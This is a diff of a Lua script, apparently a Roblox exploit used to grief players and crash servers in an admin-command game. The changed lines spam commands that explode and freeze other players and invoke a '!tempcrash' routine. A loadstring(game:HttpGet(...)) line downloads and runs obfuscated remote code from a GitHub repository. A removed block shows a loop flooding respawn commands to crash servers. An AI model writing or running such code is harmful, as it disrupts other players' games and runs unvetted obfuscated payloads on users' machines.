@@ -28,7 +28,7 @@ local lplayer = game.Players.LocalPlayer
 local userId = game.Players.LocalPlayer.UserId
 local antivg = true
 local connections = {} -- If you're gonna alter the script then please add any connections that you add to a table so it can be closed with the !closemod command
-local BlacklistedGear = {"VampireVanquisher","IvoryPeriastron","PaintBucket","SubspaceTripmine","Transmorpher","LaserFingerPointers"} -- You can find the tool names using this script https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/Inventory%20tool%20checker
+local BlacklistedGear = {"VampireVanquisher","IvoryPeriastron","PaintBucket","SubspaceTripmine","Transmorpher","LaserFingerPointers","SeaThemedCrossbow","RageTable","IceStaff"} -- You can find the tool names using this script https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/Inventory%20tool%20checker
 
 -- CONFIGURE ANYTHING BELOW
 
@@ -507,18 +507,9 @@ lplayer.Chatted:Connect(function(msg)
             game.Players:Chat("ff/others/others/others/"..math.random(1,1000))
             game.Players:Chat("trip/others/"..math.random(1,1000))
             game.Players:Chat("explode/others/"..math.random(1,1000));wait(3.5)
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Obfuscated-art/main/Basic%20antisilcrash.lua'),true))();wait(2.5)
             game.Players:Chat("!s")
-            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Obfuscated-art/main/Basic%20antisilcrash.lua'),true))();wait(1)
-            local playercount = game.Players:GetPlayers()
-            if #playercount == 5 or #playercount == 6 or #playercount == 7 then
-                for i = 1, 20 do
-                    for i = 1, 99 do
-                        game.Players:Chat("respawn/all all all "..math.random(1,1000))
-                    end
-                    wait(.51)
-                end
-            end
-        end
+            game.Players:Chat("!tempcrash fuck")
     elseif string.sub(msg:lower(), 0, 10) == "!tempcrash" then
         if shared.mod == true then
             local playercount = game.Players:GetPlayers()
